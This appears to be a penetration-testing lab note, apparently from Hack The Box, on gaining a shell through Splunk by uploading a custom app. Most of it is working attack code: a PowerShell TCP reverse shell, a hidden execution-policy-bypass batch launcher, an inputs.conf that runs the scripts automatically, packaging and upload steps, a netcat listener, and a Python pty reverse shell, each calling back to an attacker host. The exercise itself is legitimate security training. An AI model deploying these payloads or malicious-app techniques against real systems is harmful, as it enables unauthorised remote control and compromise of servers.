## Abusing Built-In Functionality

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.

To achieve this, we first need to create a custom Splunk application using the following directory structure.

```shell
3kjS@htb[/htb]$ tree 

splunk_shell/ splunk_shell/ 
├── bin 
└── default 

2 directories, 0 files
```

```powershell
#A simple and small reverse shell. Options and help removed to save space. #Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well. 
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName 
System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```shell
3kjS@htb[/htb]$ cat inputs.conf 

[script://./bin/rev.py] 
disabled = 0 
interval = 10 
sourcetype = shell 

[script://.\bin\run.bat] 
disabled = 0 
sourcetype = shell 
interval = 10
```

```shell
@ECHO OFF 
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'" 
Exit
```

```shell
3kjS@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/ 

splunk_shell/ 
splunk_shell/bin/ 
splunk_shell/bin/rev.py 
splunk_shell/bin/run.bat 
splunk_shell/bin/run.ps1 
splunk_shell/default/ 
splunk_shell/default/inputs.conf
```

```url
https://10.129.201.50:8000/en-US/manager/search/apps/local
```
![](Pasted%20image%2020260730130948.png)

```shell
3kjS@htb[/htb]$ sudo nc -lnvp 443 

listening on [any] 443 ...
```

```url
https://10.129.201.50:8000/en-US/manager/appinstall/_upload?breadcrumbs=Settings%7C%2Fmanager%2Fsearch%2F%09Apps%7C%2Fmanager%2Fsearch%2Fapps%2Flocal
```
![](Pasted%20image%2020260730131020.png)

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

![](Screenshot%202026-07-30%20at%2013.10.38.png)

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

```python
import sys,socket,os,pty 

ip="10.10.14.15" 
port="443" 
s=socket.socket() 
s.connect((ip,int(port))) 
[os.dup2(s.fileno(),fd) for fd in (0,1,2)] 
pty.spawn('/bin/bash')
```
